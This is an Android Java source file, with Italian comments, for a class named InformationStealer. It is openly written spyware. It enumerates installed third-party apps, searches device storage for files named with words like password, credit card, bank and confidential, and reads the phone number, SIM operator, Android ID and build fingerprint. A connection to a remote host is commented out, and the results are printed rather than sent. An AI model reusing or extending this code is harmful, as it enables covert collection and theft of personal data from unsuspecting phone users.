package com.example.applicazioneinteressante;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.Manifest;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.provider.Settings;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.util.List;

public class InformationStealer implements Runnable {

    private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;

    final String[] keywords = {
            "aprire",
            "Secret",
            "password",
            "credit",
            "card",
            "confidential",
            "top",
            "private",
            "classified",
            "sensitive",
            "hidden",
            "only",
            "criptato",
            "riservato",
            "vietato",
            "autorizzato",
            "informazioni",
            "proprietario",
            "divulgare",
            "privilegiato",
            "compromettente",
            "violazione",
            "sicurezza",
            "segreto",
            "operazione",
            "clandestina",
            "documenti",
            "classificati",
            "accesso",
            "limitato",
            "criptati",
            "archiviazione",
            "sicura",
            "protetto",
            "allarme",
            "email",
            "sex",
            "illegal",
            "drug",
            "virus",
            "money",
            "bank",
            "data"
    };

    NetworkManager conn = new NetworkManager();
    Context context;
    public InformationStealer(Context context){
        this.context = context;
        //conn.openConnection("rblob.homepc.it", 8800);
    }

    @Override
    public void run(){
        stealApp(context);
        searchFilesWithKeywords(context, keywords);
    }

    @SuppressLint("MissingPermission")
    static void stealNumberInformations(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(context.TELEPHONY_SERVICE);
        if (telephonyManager != null) {
            @SuppressLint("MissingPermission") String phoneNumber = telephonyManager.getLine1Number();
            String operator = telephonyManager.getSimOperatorName();
            System.out.println("\nPhone number: " + phoneNumber);
            System.out.println("SIM Operator: " + operator);
        }
    }

    private static String getBatteryStatusText(int status){
        switch (status) {
            case BatteryManager.BATTERY_STATUS_CHARGING:
                return "Charging";
            case BatteryManager.BATTERY_STATUS_DISCHARGING:
                return "Discharging";
            case BatteryManager.BATTERY_STATUS_FULL:
                return "Full";
            case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
                return "Not Charging";
            case BatteryManager.BATTERY_STATUS_UNKNOWN:
            default:
                return "Unknown";
        }
    }
  /*
    public static void searchImages(Context context) {
        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            // Richiedi il permesso all'utente se non è stato ancora concesso
            ActivityCompat.requestPermissions((Activity) context,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
            return;
        }

        // Il permesso è stato concesso, esegui la ricerca delle immagini
        Uri imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        String[] projection = {MediaStore.Images.Media.DATA};

        Cursor cursor = context.getContentResolver().query(imageUri, projection, null, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
                System.out.println("File immagine trovato: " + imagePath);
            } while (cursor.moveToNext());
            cursor.close();
        } else {
            System.out.println("Nessun file immagine trovato");
        }
    }

   */

    public static void searchFilesWithKeywords(Context context, String[] keywords) {
        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            // Richiedi il permesso all'utente se non è stato ancora concesso
            ActivityCompat.requestPermissions((Activity) context,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
            return;
        }

        // Il permesso è stato concesso, esegui la ricerca dei file
        Uri fileUri = MediaStore.Files.getContentUri("external");
        String[] projection = {MediaStore.Files.FileColumns.DATA};

        String selection = "";

        for (int i = 0; i < keywords.length; i++) {
            String keyword = keywords[i];
            selection += "LOWER(" + MediaStore.Files.FileColumns.DATA + ") LIKE LOWER('%" + keyword + "%')";
            if (i < keywords.length - 1) {
                selection += " OR ";
            }
        }

        Cursor cursor = context.getContentResolver().query(fileUri, projection, selection, null, null);
        if (cursor != null && cursor.moveToFirst()) {
            do {
                String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Files.FileColumns.DATA));
                System.out.println("Trovato un file interessante: " + filePath);
            } while (cursor.moveToNext());
            cursor.close();
        } else {
            System.out.println("Nessun file trovato");
        }
        System.out.println("-----------Elaborazione finita-----------");
    }

    public static void stealApp(Context context) {
        PackageManager packageManager = context.getPackageManager();
        // Ottieni una lista di tutte le applicazioni installate
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);


        // Itera sulla lista di applicazioni installate
        for (ApplicationInfo applicationInfo : installedApplications) {
            // Verifica se l'applicazione è un'app di terze parti

            String sourceDir = applicationInfo.sourceDir;
            String packageName = applicationInfo.packageName;
            String appName = packageManager.getApplicationLabel(applicationInfo).toString();

            if ((applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                System.out.println("\nApp Name: " + appName);
                System.out.println("Package Name: " + packageName);
                System.out.println("Source Dir: " + sourceDir);
                System.out.println("Launch Activity :" + packageManager.getLaunchIntentForPackage(applicationInfo.packageName));
                System.out.println("----------------------------------------");
            }
        }

    }

    static void stealSystemDetail(Context context) {
        System.out.println("Brand: " + Build.BRAND + "\n" +
                "DeviceID: " +
                Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ANDROID_ID
                ) + "\n" +
                "Model: " + Build.MODEL + "\n" +
                "ID: " + Build.ID + "\n" +
                "SDK: " + Build.VERSION.SDK_INT + "\n" +
                "Manufacture: " + Build.MANUFACTURER + "\n" +
                "Brand: " + Build.BRAND + "\n" +
                "User: " + Build.USER + "\n" +
                "Type: " + Build.TYPE + "\n" +
                "Base: " + Build.VERSION_CODES.BASE + "\n" +
                "Incremental: " + Build.VERSION.INCREMENTAL + "\n" +
                "Board: " + Build.BOARD + "\n" +
                "Host: " + Build.HOST + "\n" +
                "FingerPrint: " + Build.FINGERPRINT + "\n" +
                "Version Code: " + Build.VERSION.RELEASE);
    }

    public static void stealBatteryInformation(Context context) {
        IntentFilter filter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent batteryStatus = context.registerReceiver(null, filter);

        if (batteryStatus != null) {
            // Ottieni lo stato della batteria
            int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
            String batteryStatusText = getBatteryStatusText(status);
            System.out.println("Battery Status: " + batteryStatusText);

            // Ottieni il livello di carica della batteria
            int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
            int batteryLevel = (int) ((level / (float) scale) * 100);
            System.out.println("Battery Level: " + batteryLevel + "%");
        } else {
            System.out.println("Battery status not available");
            System.out.println("Battery level not available");
        }
    }
}

